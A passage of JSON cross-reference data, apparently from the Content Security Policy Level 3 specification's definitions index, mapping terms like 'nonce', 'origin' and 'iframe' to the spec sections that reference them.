"},{"refs":[{"id":"ref-for-concept-request-nonce-metadata\u2465"}],"title":"6.6.1.2. \n    Script directives post-request check\n  "},{"refs":[{"id":"ref-for-concept-request-nonce-metadata\u2466"}],"title":"6.6.2.2. \n    Does nonce match source list?\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-nonce-metadata"},
"78dac792": {"dfnID":"78dac792","dfnText":"HostEnsureCanCompileStrings()","external":true,"refSections":[{"refs":[{"id":"ref-for-sec-hostensurecancompilestrings"}],"title":"4.3. Integration with ECMAScript"},{"refs":[{"id":"ref-for-sec-hostensurecancompilestrings\u2460"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "}],"url":"https://tc39.github.io/ecma262#sec-hostensurecancompilestrings"},
"7a3dbdb1": {"dfnID":"7a3dbdb1","dfnText":"strictly split a string","external":true,"refSections":[{"refs":[{"id":"ref-for-strictly-split"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "},{"refs":[{"id":"ref-for-strictly-split\u2460"}],"title":"6.6.2.10. \n    path-part matching\n  "}],"url":"https://infra.spec.whatwg.org/#strictly-split"},
"7a87d819": {"dfnID":"7a87d819","dfnText":"is","external":true,"refSections":[{"refs":[{"id":"ref-for-string-is"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-string-is\u2460"}],"title":"6.6.2.2. \n    Does nonce match source list?\n  "},{"refs":[{"id":"ref-for-string-is\u2461"}],"title":"6.6.2.9. \n    port-part matching\n  "},{"refs":[{"id":"ref-for-string-is\u2462"},{"id":"ref-for-string-is\u2463"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "}],"url":"https://infra.spec.whatwg.org/#string-is"},
"7da56b7d": {"dfnID":"7da56b7d","dfnText":"sha-384","external":true,"refSections":[{"refs":[{"id":"ref-for-something\u2460"},{"id":"ref-for-something\u2461"},{"id":"ref-for-something\u2462"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "}],"url":"https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#"},
"7f9469b5": {"dfnID":"7f9469b5","dfnText":"ascii case-insensitive","external":true,"refSections":[{"refs":[{"id":"ref-for-ascii-case-insensitive"}],"title":"3.3. \n    The <meta> element\n  "},{"refs":[{"id":"ref-for-ascii-case-insensitive\u2460"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "},{"refs":[{"id":"ref-for-ascii-case-insensitive\u2461"}],"title":"6.3.3.1. \n    navigate-to Pre-Navigation Check\n  "},{"refs":[{"id":"ref-for-ascii-case-insensitive\u2462"}],"title":"6.3.3.2. \n    navigate-to Navigation Response Check\n  "},{"refs":[{"id":"ref-for-ascii-case-insensitive\u2463"},{"id":"ref-for-ascii-case-insensitive\u2464"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-ascii-case-insensitive\u2465"}],"title":"6.6.2.5. \n    Does url match source list in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-ascii-case-insensitive\u2466"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-ascii-case-insensitive\u2467"},{"id":"ref-for-ascii-case-insensitive\u2468"},{"id":"ref-for-ascii-case-insensitive\u2460\u24ea"},{"id":"ref-for-ascii-case-insensitive\u2460\u2460"},{"id":"ref-for-ascii-case-insensitive\u2460\u2461"},{"id":"ref-for-ascii-case-insensitive\u2460\u2462"},{"id":"ref-for-ascii-case-insensitive\u2460\u2463"}],"title":"6.6.2.7. \n    scheme-part matching\n  "},{"refs":[{"id":"ref-for-ascii-case-insensitive\u2460\u2464"},{"id":"ref-for-ascii-case-insensitive\u2460\u2465"}],"title":"6.6.2.8. \n    host-part matching\n  "},{"refs":[{"id":"ref-for-ascii-case-insensitive\u2460\u2466"},{"id":"ref-for-ascii-case-insensitive\u2460\u2467"}],"title":"6.6.3.1. \n    Is element nonceable?\n  "},{"refs":[{"id":"ref-for-ascii-case-insensitive\u2460\u2468"}],"title":"6.6.3.2. \n    Does a source list allow all inline behavior for type?\n  "},{"refs":[{"id":"ref-for-ascii-case-insensitive\u2461\u24ea"},{"id":"ref-for-ascii-case-insensitive\u2461\u2460"},{"id":"ref-for-ascii-case-insensitive\u2461\u2461"},{"id":"ref-for-ascii-case-insensitive\u2461\u2462"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "}],"url":"https://infra.spec.whatwg.org/#ascii-case-insensitive"},
"8394d1b7": {"dfnID":"8394d1b7","dfnText":"keepalive","external":true,"refSections":[{"refs":[{"id":"ref-for-request-keepalive-flag"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://fetch.spec.whatwg.org/#request-keepalive-flag"},
"83c59a3a": {"dfnID":"83c59a3a","dfnText":"WorkerGlobalScope","external":true,"refSections":[{"refs":[{"id":"ref-for-workerglobalscope"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-workerglobalscope\u2460"},{"id":"ref-for-workerglobalscope\u2461"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-workerglobalscope\u2462"}],"title":"4.2.3. \n    Retrieve the CSP list of an object\n  "}],"url":"https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope"},
"84b454ff": {"dfnID":"84b454ff","dfnText":"ordered map","external":true,"refSections":[{"refs":[{"id":"ref-for-ordered-map"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "}],"url":"https://infra.spec.whatwg.org/#ordered-map"},
"852ada56": {"dfnID":"852ada56","dfnText":"port (for url)","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-url-port"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-concept-url-port\u2460"}],"title":"6.6.2.9. \n    port-part matching\n  "}],"url":"https://url.spec.whatwg.org/#concept-url-port"},
"85394472": {"dfnID":"85394472","dfnText":"Document","external":true,"refSections":[{"refs":[{"id":"ref-for-document"}],"title":"1.2. Goals"},{"refs":[{"id":"ref-for-document\u2460"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-document\u2461"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-document\u2462"}],"title":"3.3. \n    The <meta> element\n  "},{"refs":[{"id":"ref-for-document\u2463"},{"id":"ref-for-document\u2464"},{"id":"ref-for-document\u2465"},{"id":"ref-for-document\u2466"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-document\u2467"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-document\u2468"}],"title":"4.2.3. \n    Retrieve the CSP list of an object\n  "},{"refs":[{"id":"ref-for-document\u2460\u24ea"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-document\u2460\u2460"}],"title":"5.3. \n    Report a violation\n  "},{"refs":[{"id":"ref-for-document\u2460\u2461"}],"title":"6.1.14. style-src"},{"refs":[{"id":"ref-for-document\u2460\u2462"}],"title":"6.2.1. base-uri"},{"refs":[{"id":"ref-for-document\u2460\u2463"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "},{"refs":[{"id":"ref-for-document\u2460\u2464"},{"id":"ref-for-document\u2460\u2465"},{"id":"ref-for-document\u2460\u2466"}],"title":"6.2.2.2. \n    sandbox Initialization\n  "},{"refs":[{"id":"ref-for-document\u2460\u2467"},{"id":"ref-for-document\u2460\u2468"}],"title":"7.8. \n    CSP Inheriting to avoid bypasses\n  "}],"url":"https://dom.spec.whatwg.org/#document"},
"857d5516": {"dfnID":"857d5516","dfnText":"client","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-client"}],"title":"2.4.2. \n    Create a violation object for request, and policy.\n  "},{"refs":[{"id":"ref-for-concept-request-client\u2460"},{"id":"ref-for-concept-request-client\u2461"}],"title":"4.1.2. \n    Report Content Security Policy violations for request\n  "},{"refs":[{"id":"ref-for-concept-request-client\u2462"},{"id":"ref-for-concept-request-client\u2463"}],"title":"4.1.3. \n    Should request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-request-client\u2464"},{"id":"ref-for-concept-request-client\u2465"}],"title":"4.1.4. \n    Should response to request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-request-client\u2466"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-concept-request-client\u2467"},{"id":"ref-for-concept-request-client\u2468"},{"id":"ref-for-concept-request-client\u2460\u24ea"},{"id":"ref-for-concept-request-client\u2460\u2460"}],"title":"4.2.5. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-request-client\u2460\u2461"},{"id":"ref-for-concept-request-client\u2460\u2462"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-request-client\u2460\u2463"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-client"},
"87fcd40c": {"dfnID":"87fcd40c","dfnText":"iframe","external":true,"refSections":[{"refs":[{"id":"ref-for-the-iframe-element"},{"id":"ref-for-the-iframe-element\u2460"}],"title":"6.1.1. child-src"},{"refs":[{"id":"ref-for-the-iframe-element\u2461"},{"id":"ref-for-the-iframe-element\u2462"}],"title":"6.2.2. sandbox"},{"refs":[{"id":"ref-for-the-iframe-element\u2463"}],"title":"6.3.2. frame-ancestors"}],"url":"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element"},
"8855a9aa": {"dfnID":"8855a9aa","dfnText":"DOMString","external":true,"refSections":[{"refs":[{"id":"ref-for-idl-DOMString"},{"id":"ref-for-idl-DOMString\u2460"},{"id":"ref-for-idl-DOMString\u2461"}],"title":"5. \n    Reporting\n  "},{"refs":[{"id":"ref-for-idl-DOMString\u2462"},{"id":"ref-for-idl-DOMString\u2463"},{"id":"ref-for-idl-DOMString\u2464"},{"id":"ref-for-idl-DOMString\u2465"},{"id":"ref-for-idl-DOMString\u2466"},{"id":"ref-for-idl-DOMString\u2467"},{"id":"ref-for-idl-DOMString\u2468"},{"id":"ref-for-idl-DOMString\u2460\u24ea"}],"title":"5.1. \n    Violation DOM Events\n  "}],"url":"https://webidl.spec.whatwg.org/#idl-DOMString"},
"889e932f": {"dfnID":"889e932f","dfnText":"Exposed","external":true,"refSections":[{"refs":[{"id":"ref-for-Exposed"}],"title":"5. \n    Reporting\n  "},{"refs":[{"id":"ref-for-Exposed\u2460"}],"title":"5.1. \n    Violation DOM Events\n  "}],"url":"https://webidl.spec.whatwg.org/#Exposed"},
"88ed8860": {"dfnID":"88ed8860","dfnText":"frame","external":true,"refSections":[{"refs":[{"id":"ref-for-frame"},{"id":"ref-for-frame\u2460"}],"title":"6.1.1. child-src"},{"refs":[{"id":"ref-for-frame\u2461"}],"title":"6.3.2. frame-ancestors"}],"url":"https://html.spec.whatwg.org/multipage/obsolete.html#frame"},
"8a30477b": {"dfnID":"8a30477b","dfnText":"global object (for environment settings object)","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-settings-object-global"}],"title":"2.4.2. \n    Create a violation object for request, and policy.\n  "},{"refs":[{"id":"ref-for-concept-settings-object-global\u2460"}],"title":"4.1.2. \n    Report Content Security Policy violations for request\n  "},{"refs":[{"id":"ref-for-concept-settings-object-global\u2461"}],"title":"4.1.3. \n    Should request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-settings-object-global\u2462"}],"title":"4.1.4. \n    Should response to request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-settings-object-global\u2463"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-concept-settings-object-global\u2464"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-settings-object-global\u2465"},{"id":"ref-for-concept-settings-object-global\u2466"},{"id":"ref-for-concept-settings-object-global\u2467"},{"id":"ref-for-concept-settings-object-global\u2468"}],"title":"4.2.5. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-settings-object-global\u2460\u24ea"},{"id":"ref-for-concept-settings-object-global\u2460\u2460"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "}],"url":"https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global"},
"8b547cc7": {"dfnID":"8b547cc7","dfnText":"composed","external":true,"refSections":[{"refs":[{"id":"ref-for-dom-event-composed"},{"id":"ref-for-dom-event-composed\u2460"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://dom.spec.whatwg.org/#dom-event-composed"},
"8c209bab": {"dfnID":"8c209bab","dfnText":"create and initialize a new document object","external":true,"refSections":[{"refs":[{"id":"ref-for-initialise-the-document-object"}],"title":"4.2. \n    Integration with HTML\n  "}],"url":"https://html.spec.whatwg.org/#initialise-the-document-object"},
"8c3deeef": {"dfnID":"8c3deeef","dfnText":"redirect count","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-redirect-count"}],"title":"6.6.2.3. \n    Does request match source list?\n  "},{"refs":[{"id":"ref-for-concept-request-redirect-count\u2460"}],"title":"6.6.2.4. \n    Does response to request match source list?\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-redirect-count"},
"8e9945a0": {"dfnID":"8e9945a0","dfnText":"body","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-body"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-body"},
"8f69ce41": {"dfnID":"8f69ce41","dfnText":"percent-decode","external":true,"refSections":[{"refs":[{"id":"ref-for-string-percent-decode"},{"id":"ref-for-string-percent-decode\u2460"}],"title":"6.6.2.10. \n    path-part matching\n  "}],"url":"https://url.spec.whatwg.org/#string-percent-decode"},
"902380f7": {"dfnID":"902380f7","dfnText":"credentials mode","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-credentials-mode"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-credentials-mode"},
"9055b6c6": {"dfnID":"9055b6c6","dfnText":"representation","external":true,"refSections":[{"refs":[{"id":"ref-for-section-3"}],"title":"3. \n    Policy Delivery\n  "},{"refs":[{"id":"ref-for-section-3\u2460"},{"id":"ref-for-section-3\u2461"}],"title":"3.1. \n    The Content-Security-Policy HTTP Response Header Field\n  "},{"refs":[{"id":"ref-for-section-3\u2462"},{"id":"ref-for-section-3\u2463"}],"title":"3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  "}],"url":"https://tools.ietf.org/html/rfc7231#section-3"},
"92812d1b": {"dfnID":"92812d1b","dfnText":"content security policy state","external":true,"refSections":[{"refs":[{"id":"ref-for-attr-meta-http-equiv-content-security-policy"}],"title":"3.3. \n    The <meta> element\n  "}],"url":"https://html.spec.whatwg.org/#attr-meta-http-equiv-content-security-policy"},
"946a9318": {"dfnID":"946a9318","dfnText":"form","external":true,"refSections":[{"refs":[{"id":"ref-for-the-form-element"}],"title":"6.3.3. navigate-to"}],"url":"https://html.spec.whatwg.org/multipage/forms.html#the-form-element"},
"959ad97b": {"dfnID":"959ad97b","dfnText":"origin","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-url-origin"}],"title":"4.1.1. \n    Set response\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-concept-url-origin\u2460"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "}],"url":"https://url.spec.whatwg.org/#concept-url-origin"},
"9638f92b": {"dfnID":"9638f92b","dfnText":"connected","external":true,"refSections":[{"refs":[{"id":"ref-for-connected"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://dom.spec.whatwg.org/#connected"},
"99b5cef6": {"dfnID":"99b5cef6","dfnText":"object","external":true,"refSections":[{"refs":[{"id":"ref-for-the-object-element"},{"id":"ref-for-the-object-element\u2460"},{"id":"ref-for-the-object-element\u2461"},{"id":"ref-for-the-object-element\u2462"}],"title":"6.1.9. object-src"},{"refs":[{"id":"ref-for-the-object-element\u2463"}],"title":"6.3.2. frame-ancestors"}],"url":"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element"},
"9a517a7d": {"dfnID":"9a517a7d","dfnText":"queue a task","external":true,"refSections":[{"refs":[{"id":"ref-for-queue-a-task"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://html.spec.whatwg.org/multipage/webappapis.html#queue-a-task"},
"9ad09878": {"dfnID":"9ad09878","dfnText":"group","external":true,"refSections":[{"refs":[{"id":"ref-for-group"}],"title":"6.4.2. report-to"}],"url":"https://w3c.github.io/reporting/#group"},
"9c4c1e66": {"dfnID":"9c4c1e66","dfnText":"relevant settings object","external":true,"refSections":[{"refs":[{"id":"ref-for-relevant-settings-object"},{"id":"ref-for-relevant-settings-object\u2460"},{"id":"ref-for-relevant-settings-object\u2461"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object"},
"9d459c32": {"dfnID":"9d459c32","dfnText":"\"parser-inserted\"","external":true,"refSections":[{"refs":[{"id":"ref-for-parser-inserted"}],"title":"1.3. Changes from Level 2"},{"refs":[{"id":"ref-for-parser-inserted\u2460"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-parser-inserted\u2461"}],"title":"6.6.1.2. \n    Script directives post-request check\n  "},{"refs":[{"id":"ref-for-parser-inserted\u2462"},{"id":"ref-for-parser-inserted\u2463"},{"id":"ref-for-parser-inserted\u2464"}],"title":"8.2. \n    Usage of \"'strict-dynamic'\"\n  "}],"url":"https://html.spec.whatwg.org/#parser-inserted"},
"a088e610": {"dfnID":"a088e610","dfnText":"convert","external":true,"refSections":[{"refs":[{"id":"ref-for-javascript-string-convert"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "}],"url":"https://infra.spec.whatwg.org/#javascript-string-convert"},
"a13a702f": {"dfnID":"a13a702f","dfnText":"SharedWorker","external":true,"refSections":[{"refs":[{"id":"ref-for-sharedworker"}],"title":"6.1.1. child-src"},{"refs":[{"id":"ref-for-sharedworker\u2460"}],"title":"6.1.17. worker-src"}],"url":"https://html.spec.whatwg.org/multipage/workers.html#sharedworker"},
"a1d47575": {"dfnID":"a1d47575","dfnText":"status","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-response-status"}],"title":"6.3.3.1. \n    navigate-to Pre-Navigation Check\n  "},{"refs":[{"id":"ref-for-concept-response-status\u2460"}],"title":"6.3.3.2. \n    navigate-to Navigation Response Check\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-response-status"},
"a23d12a9": {"dfnID":"a23d12a9","dfnText":"scheme","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-origin-scheme"},{"id":"ref-for-concept-origin-scheme\u2460"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "}],"url":"https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-scheme"},
"a33db89a": {"dfnID":"a33db89a","dfnText":"fetch","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-fetch"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-fetch"},
"a37f05fd": {"dfnID":"a37f05fd","dfnText":"strip leading and trailing ascii whitespace","external":true,"refSections":[{"refs":[{"id":"ref-for-strip-leading-and-trailing-ascii-whitespace"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "}],"url":"https://infra.spec.whatwg.org/#strip-leading-and-trailing-ascii-whitespace"},
"a3b18719": {"dfnID":"a3b18719","dfnText":"append (for set)","external":true,"refSections":[{"refs":[{"id":"ref-for-set-append"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "}],"url":"https://infra.spec.whatwg.org/#set-append"},
"a8b25997": {"dfnID":"a8b25997","dfnText":"redirect status","external":true,"refSections":[{"refs":[{"id":"ref-for-redirect-status"}],"title":"6.3.3.2. \n    navigate-to Navigation Response Check\n  "}],"url":"https://fetch.spec.whatwg.org/#redirect-status"},
"a973e0fe": {"dfnID":"a973e0fe","dfnText":"document","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-document"},{"id":"ref-for-concept-document\u2460"},{"id":"ref-for-concept-document\u2461"},{"id":"ref-for-concept-document\u2462"},{"id":"ref-for-concept-document\u2463"}],"title":"6.3.3. navigate-to"}],"url":"https://dom.spec.whatwg.org/#concept-document"},
"abstract-opdef-parse-a-serialized-csp": {"dfnID":"abstract-opdef-parse-a-serialized-csp","dfnText":"parse a serialized CSP","external":false,"refSections":[{"refs":[{"id":"ref-for-abstract-opdef-parse-a-serialized-csp"}],"title":"2.2.2. \n    Parse a serialized CSP list\n  "},{"refs":[{"id":"ref-for-abstract-opdef-parse-a-serialized-csp\u2460"}],"title":"3.1. \n    The Content-Security-Policy HTTP Response Header Field\n  "},{"refs":[{"id":"ref-for-abstract-opdef-parse-a-serialized-csp\u2461"}],"title":"3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  "},{"refs":[{"id":"ref-for-abstract-opdef-parse-a-serialized-csp\u2462"}],"title":"4.1. \n    Integration with Fetch\n  "}],"url":"#abstract-opdef-parse-a-serialized-csp"},
"abstract-opdef-parse-a-serialized-csp-list": {"dfnID":"abstract-opdef-parse-a-serialized-csp-list","dfnText":"parse a serialized CSP list","external":false,"refSections":[{"refs":[{"id":"ref-for-abstract-opdef-parse-a-serialized-csp-list"},{"id":"ref-for-abstract-opdef-parse-a-serialized-csp-list\u2460"}],"title":"4.1.1. \n    Set response\u2019s CSP list\n  "}],"url":"#abstract-opdef-parse-a-serialized-csp-list"},
"ae2a6342": {"dfnID":"ae2a6342","dfnText":"top-level browsing context","external":true,"refSections":[{"refs":[{"id":"ref-for-top-level-browsing-context"}],"title":"6.1.9. object-src"}],"url":"https://html.spec.whatwg.org/multipage/document-sequences.html#top-level-browsing-context"},
"ae8def21": {"dfnID":"ae8def21","dfnText":"contain","external":true,"refSections":[{"refs":[{"id":"ref-for-list-contain"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-list-contain\u2460"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-list-contain\u2461"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "}],"url":"https://infra.spec.whatwg.org/#list-contain"},
"af6109ae": {"dfnID":"af6109ae","dfnText":"base64 encoding","external":true,"refSections":[{"refs":[{"id":"ref-for-section-4"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-section-4\u2460"},{"id":"ref-for-section-4\u2461"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "}],"url":"https://tools.ietf.org/html/rfc4648#section-4"},
"allow-base-for-document": {"dfnID":"allow-base-for-document","dfnText":"6.2.1.1. \n    Is base allowed for document?\n  ","external":false,"refSections":[{"refs":[{"id":"ref-for-allow-base-for-document"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-allow-base-for-document"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "}],"url":"#allow-base-for-document"},
"b01b1359": {"dfnID":"b01b1359","dfnText":"opaque origin","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-origin-opaque"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-concept-origin-opaque\u2460"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "}],"url":"https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-opaque"},
"b0d7f3c3": {"dfnID":"b0d7f3c3","dfnText":"USVString","external":true,"refSections":[{"refs":[{"id":"ref-for-idl-USVString"},{"id":"ref-for-idl-USVString\u2460"},{"id":"ref-for-idl-USVString\u2461"},{"id":"ref-for-idl-USVString\u2462"}],"title":"5. \n    Reporting\n  "},{"refs":[{"id":"ref-for-idl-USVString\u2463"},{"id":"ref-for-idl-USVString\u2464"},{"id":"ref-for-idl-USVString\u2465"},{"id":"ref-for-idl-USVString\u2466"},{"id":"ref-for-idl-USVString\u2467"},{"id":"ref-for-idl-USVString\u2468"},{"id":"ref-for-idl-USVString\u2460\u24ea"},{"id":"ref-for-idl-USVString\u2460\u2460"},{"id":"ref-for-idl-USVString\u2460\u2461"},{"id":"ref-for-idl-USVString\u2460\u2462"}],"title":"5.1. \n    Violation DOM Events\n  "}],"url":"https://webidl.spec.whatwg.org/#idl-USVString"},
"b1dc7351": {"dfnID":"b1dc7351","dfnText":"sha-512","external":true,"refSections":[{"refs":[{"id":"ref-for-something\u2460"},{"id":"ref-for-something\u2461"},{"id":"ref-for-something\u2462"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "}],"url":"https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#"},
"b1e9fc19": {"dfnID":"b1e9fc19","dfnText":"nonce","external":true,"refSections":[{"refs":[{"id":"ref-for-attr-nonce"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "},{"refs":[{"id":"ref-for-attr-nonce\u2460"}],"title":"7.2.2. Nonce exfiltration via content attributes"},{"refs":[{"id":"ref-for-attr-nonce\u2461"}],"title":"8.2. \n    Usage of \"'strict-dynamic'\"\n  "}],"url":"https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce"},
"b29084c6": {"dfnID":"b29084c6","dfnText":"split a string on commas","external":true,"refSections":[{"refs":[{"id":"ref-for-split-on-commas"}],"title":"2.2.2. \n    Parse a serialized CSP list\n  "}],"url":"https://infra.spec.whatwg.org/#split-on-commas"},
"b410a6ef": {"dfnID":"b410a6ef","dfnText":"ascii serialization of an origin","external":true,"refSections":[{"refs":[{"id":"ref-for-ascii-serialisation-of-an-origin"}],"title":"6.3.2.1. \n    frame-ancestors Navigation Response Check\n  "}],"url":"https://html.spec.whatwg.org/multipage/browsers.html#ascii-serialisation-of-an-origin"},
"b4f2d668": {"dfnID":"b4f2d668","dfnText":"origin","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-origin"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-concept-origin\u2460"}],"title":"6.6.2.5. \n    Does url match source list in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-concept-origin\u2461"},{"id":"ref-for-concept-origin\u2462"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "}],"url":"https://html.spec.whatwg.org/#concept-origin"},
"b8308563": {"dfnID":"b8308563","dfnText":"DedicatedWorkerGlobalScope","external":true,"refSections":[{"refs":[{"id":"ref-for-dedicatedworkerglobalscope"}],"title":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  "}],"url":"https://html.spec.whatwg.org/multipage/workers.html#dedicatedworkerglobalscope"},
"b85ee3be": {"dfnID":"b85ee3be","dfnText":"host (for url)","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-url-host"}],"title":"6.6.2.8. \n    host-part matching\n  "}],"url":"https://url.spec.whatwg.org/#concept-url-host"},
"b9d1df32": {"dfnID":"b9d1df32","dfnText":"base url","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-base-url"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://url.spec.whatwg.org/#concept-base-url"},
"ba920583": {"dfnID":"ba920583","dfnText":"style","external":true,"refSections":[{"refs":[{"id":"ref-for-the-style-element"}],"title":"6.1.14. style-src"},{"refs":[{"id":"ref-for-the-style-element\u2460"},{"id":"ref-for-the-style-element\u2461"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "},{"refs":[{"id":"ref-for-the-style-element\u2462"}],"title":"7.2.1. Dangling markup attacks"}],"url":"https://html.spec.whatwg.org/multipage/semantics.html#the-style-element"},
"base-uri": {"dfnID":"base-uri","dfnText":"base-uri","external":false,"refSections":[{"refs":[{"id":"ref-for-base-uri"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "},{"refs":[{"id":"ref-for-base-uri\u2460"}],"title":"7.3. Nonce Retargeting"},{"refs":[{"id":"ref-for-base-uri\u2461"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#base-uri"},
"bccca632": {"dfnID":"bccca632","dfnText":"eval()","external":true,"refSections":[{"refs":[{"id":"ref-for-sec-eval-x"}],"title":"1.2. Goals"},{"refs":[{"id":"ref-for-sec-eval-x\u2460"}],"title":"6.1.11. script-src"}],"url":"https://tc39.github.io/ecma262#sec-eval-x"},
"bfc1c271": {"dfnID":"bfc1c271","dfnText":"Worker","external":true,"refSections":[{"refs":[{"id":"ref-for-worker"}],"title":"1.2. Goals"},{"refs":[{"id":"ref-for-worker\u2460"}],"title":"6.1.1. child-src"},{"refs":[{"id":"ref-for-worker\u2461"}],"title":"6.1.17. worker-src"}],"url":"https://html.spec.whatwg.org/multipage/workers.html#worker"},
"c0868016": {"dfnID":"c0868016","dfnText":"path","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-url-path"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-concept-url-path\u2460"}],"title":"6.6.2.10. \n    path-part matching\n  "}],"url":"https://url.spec.whatwg.org/#concept-url-path"},
"c1d81171": {"dfnID":"c1d81171","dfnText":"sandboxed scripts browsing context flag","external":true,"refSections":[{"refs":[{"id":"ref-for-sandboxed-scripts-browsing-context-flag"}],"title":"6.2.2.1. \n    sandbox Response Check\n  "}],"url":"https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-scripts-browsing-context-flag"},
